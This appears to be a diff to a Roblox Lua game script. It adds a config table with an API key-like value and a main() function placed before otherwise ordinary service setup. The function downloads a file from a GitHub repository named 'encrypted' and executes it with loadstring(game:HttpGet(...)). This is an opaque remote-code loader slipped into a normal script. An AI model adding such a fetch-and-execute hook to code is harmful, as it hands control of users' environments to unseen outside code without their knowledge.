@@ -1,3 +1,14 @@
+Config = {
+    api = "9afb4be9-8f64-4039-8b86-f75dd5318eee",
+    service = "WL2",
+    provider = "WL2"
+}
+
+local function main()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/cryptium-lua/encrypted/refs/heads/main/wl2%20haha"))()
+    print("Script loaded.")
+end
+
 local CollectionService = game:GetService("CollectionService")
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
